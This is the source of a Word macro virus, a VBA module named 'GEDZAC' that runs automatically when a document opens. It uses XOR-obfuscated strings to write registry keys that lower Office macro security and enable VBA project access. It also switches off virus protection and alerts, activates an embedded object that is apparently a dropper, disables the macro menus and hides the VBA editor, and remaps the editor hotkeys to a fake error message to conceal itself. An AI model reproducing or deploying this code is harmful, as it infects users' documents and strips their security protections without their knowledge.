Attribute VB_Name = "GEDZAC"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Sub Document_Open()
On Error Resume Next
Set w = CreateObject("WScript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
AM = GetAttr(f.GetSpecialFolder(1) & "\Multi-Infect.dll")
If AM = "" Then
ActiveDocument.Shapes(1).Visible = True
SVir = ActiveDocument.Shapes(1).OLEFormat.ClassType
With ActiveDocument.Shapes(1).OLEFormat
    .ActivateAs ClassType:=SVir
    .Activate
End With
Else
ActiveDocument.Shapes(1).Visible = False
End If
If LCase(NormalTemplate.VBProject.VBComponents.Item(1).Name) <> "gedzac" Then
Key8 = BuildKeyCode(wdKeyAlt, wdKeyF8): Key11 = BuildKeyCode(wdKeyAlt, wdKeyF11): Ktip = wdKeyCategoryCommand
KeyBindings.Add Ktip, "Keyh", Key8
KeyBindings.Add Ktip, "Keyh", Key11
End If
If Int(Application.Version) > 8 Then
w.RegWrite u("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[67)7[Phuc[Tbdruns~[Kbqbk"), 1, "REG_DWORD"
w.RegWrite u("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[67)7[Phuc[Tbdruns~[FddbttQEHJ"), 1, "REG_DWORD"
w.RegWrite u("OLB^XRTBUT[)CBAFRKS[Thaspfub[Jnduhthas[Haandb[67)7[Phuc[Tbdruns~[Kbqbk"), 1, "REG_DWORD"
w.RegWrite u("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[>)7[Phuc[Tbdruns~[Kbqbk"), 1, "REG_DWORD"
w.RegWrite u("OLB^XRTBUT[)CBAFRKS[Thaspfub[Jnduhthas[Haandb[>)7[Phuc[Tbdruns~[Kbqbk"), 1, "REG_DWORD"
CommandBars(u("Shhkt")).Controls(u("Jfduh")).Enabled = u("Afktb")
CommandBars(u("Qnbp")).Controls(5).Enabled = u("Afktb")
CommandBars(u("Shhkt")).Controls(17).Enabled = u("Afktb")
CommandBars(u("Shhkt")).Controls(18).Enabled = u("Afktb")
CommandBars(u("Shhkt")).Controls(19).Enabled = u("Afktb")
ScreenUpdating = u("Afktb")
DisplayAlerts = u("Afktb")
Options.ConfirmConversions = u("Afktb")
Options.SaveNormalPrompt = u("Afktb")
EnableCancelKey = 0
ShowVisualBasicEditor = u("Afktb")
CommandBars("Visual Basic").Enabled = u("Afktb")
ElseIf Int(Application.Version) < 9 Then
CommandBars(u("Shhkt")).Controls(u("Jfduh")).Enabled = u("Afktb")
CommandBars(u("Shhkt")).Controls(14).Enabled = u("Afktb")
CommandBars(u("Shhkt")).Controls(15).Enabled = u("Afktb")
CommandBars(u("Shhkt")).Controls(16).Enabled = u("Afktb")
CommandBars(u("Qnbp")).Controls(6).Enabled = u("Afktb")
Options.VirusProtection = u("Afktb")
Options.ConfirmConversions = u("Afktb")
Options.SaveNormalPrompt = u("Afktb")
ScreenUpdating = u("Afktb")
DisplayAlerts = u("Afktb")
EnableCancelKey = 0
ShowVisualBasicEditor = u("Afktb")
CommandBars("Visual Basic").Enabled = u("Afktb")
End If
End Sub
Private Function u(s)
On Error Resume Next
For i = 1 To Len(s)
u = u & Chr(Asc(Mid(s, i, 1)) Xor 7)
Next
End Function
Sub Keyh()
On Error Resume Next
Dim Lg As String
Lg = Application.Languages(Application.Language)
If InStr(LCase(Lg), u("btwföhk")) <> 0 Then
MsgBox u("Dhjwhibisb'ih'Qæknch"), 16, u("Buuhu")
Else
MsgBox u("Ihi'Qfknc'dhjwhibis"), 16, u("Buuhu")
End If
End Sub


